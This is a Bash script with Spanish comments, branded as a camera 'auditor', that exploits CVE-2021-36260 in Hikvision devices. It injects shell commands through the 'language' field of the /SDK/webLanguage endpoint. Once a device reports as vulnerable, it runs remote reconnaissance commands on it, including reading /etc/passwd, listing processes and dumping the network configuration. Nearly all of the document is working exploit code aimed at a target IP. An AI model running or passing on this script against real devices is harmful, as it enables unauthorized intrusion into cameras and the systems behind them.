#!/bin/bash
# Script bash para explotar CVE-2021-36260 en dispositivos Hikvision
# Uso: ./hikvision_cve2021_36260.sh <IP_TARGET>

TARGET_IP="$1"
TARGET_PORT="80"
ENDPOINT="/SDK/webLanguage"

# Colores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # Sin color

echo -e "${BLUE}üéØ SmartCam Auditor - Hikvision CVE-2021-36260 Exploit${NC}"
echo -e "${BLUE}=================================================${NC}"

# Verificar argumentos
if [ -z "$TARGET_IP" ]; then
    echo -e "${RED}‚ùå Error: Se requiere IP objetivo${NC}"
    echo "Uso: $0 <IP_TARGET>"
    exit 1
fi

echo -e "${YELLOW}üìã Target: $TARGET_IP:$TARGET_PORT${NC}"
echo -e "${YELLOW}üìã CVE: CVE-2021-36260${NC}"
echo -e "${YELLOW}üìã Endpoint: $ENDPOINT${NC}"
echo ""

# Verificar que curl est√° disponible
if ! command -v curl &> /dev/null; then
    echo -e "${RED}‚ùå Error: curl no est√° instalado${NC}"
    exit 1
fi

# Funci√≥n para probar vulnerabilidad
test_vulnerability() {
    local ip="$1"
    local port="$2"
    local endpoint="$3"
    
    echo -e "${BLUE}üîç Probando vulnerabilidad...${NC}"
    
    # Payload para command injection
    local payload="test'|\`id\`||'"
    local url="http://$ip:$port$endpoint"
    
    # Ejecutar request con curl
    response=$(curl -s -m 10 \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "language=$payload" \
        "$url" 2>/dev/null)
    
    local curl_exit_code=$?
    
    if [ $curl_exit_code -eq 0 ]; then
        # Verificar si la respuesta contiene indicadores de command injection exitoso
        if echo "$response" | grep -q "uid=\|gid=\|groups="; then
            echo -e "${GREEN}‚úÖ [+] $ip:$port - VULNERABLE!${NC}"
            echo -e "${GREEN}‚úÖ [+] Command injection successful${NC}"
            echo -e "${GREEN}üìÑ [+] Response contains: $(echo "$response" | grep -o "uid=[^[:space:]]*")${NC}"
            return 0
        elif [ -n "$response" ]; then
            echo -e "${YELLOW}‚ö†Ô∏è [?] $ip:$port - Response received but no clear indicators${NC}"
            echo -e "${YELLOW}üìÑ [?] Response (first 100 chars): ${response:0:100}${NC}"
            return 2
        else
            echo -e "${RED}‚ùå [-] $ip:$port - No response${NC}"
            return 1
        fi
    else
        echo -e "${RED}‚ùå [-] $ip:$port - Connection failed (curl exit code: $curl_exit_code)${NC}"
        return 1
    fi
}

# Funci√≥n para ejecutar comando espec√≠fico
execute_command() {
    local ip="$1"
    local port="$2"
    local endpoint="$3"
    local cmd="$4"
    
    echo -e "${BLUE}üöÄ Ejecutando comando: $cmd${NC}"
    
    # Payload con comando espec√≠fico
    local payload="test'|\`$cmd\`||'"
    local url="http://$ip:$port$endpoint"
    
    # Ejecutar request
    response=$(curl -s -m 15 \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "language=$payload" \
        "$url" 2>/dev/null)
    
    if [ $? -eq 0 ] && [ -n "$response" ]; then
        echo -e "${GREEN}üì§ [+] Command executed successfully${NC}"
        echo -e "${GREEN}üìÑ [+] Response:${NC}"
        echo "$response" | head -20
        return 0
    else
        echo -e "${RED}‚ùå [-] Command execution failed${NC}"
        return 1
    fi
}

# Ejecutar test principal
echo -e "${BLUE}üéØ Iniciando exploit...${NC}"

# Probar vulnerabilidad b√°sica
test_result=$(test_vulnerability "$TARGET_IP" "$TARGET_PORT" "$ENDPOINT")
test_exit_code=$?

if [ $test_exit_code -eq 0 ]; then
    echo ""
    echo -e "${GREEN}üéâ ¬°DISPOSITIVO VULNERABLE CONFIRMADO!${NC}"
    echo ""
    
    # Ejecutar comandos adicionales si es vulnerable
    echo -e "${BLUE}üî¨ Ejecutando comandos de reconocimiento...${NC}"
    
    # Informaci√≥n del sistema
    execute_command "$TARGET_IP" "$TARGET_PORT" "$ENDPOINT" "uname -a"
    echo ""
    
    # Usuarios del sistema
    execute_command "$TARGET_IP" "$TARGET_PORT" "$ENDPOINT" "cat /etc/passwd | head -10"
    echo ""
    
    # Procesos en ejecuci√≥n
    execute_command "$TARGET_IP" "$TARGET_PORT" "$ENDPOINT" "ps aux | head -10"
    echo ""
    
    # Informaci√≥n de red
    execute_command "$TARGET_IP" "$TARGET_PORT" "$ENDPOINT" "ifconfig"
    echo ""
    
    echo -e "${GREEN}‚úÖ Exploit completado exitosamente${NC}"
    exit 0
    
elif [ $test_exit_code -eq 2 ]; then
    echo -e "${YELLOW}‚ö†Ô∏è Resultado incierto - revisar manualmente${NC}"
    exit 2
else
    echo -e "${RED}‚ùå Dispositivo no vulnerable o no accesible${NC}"
    exit 1
fi
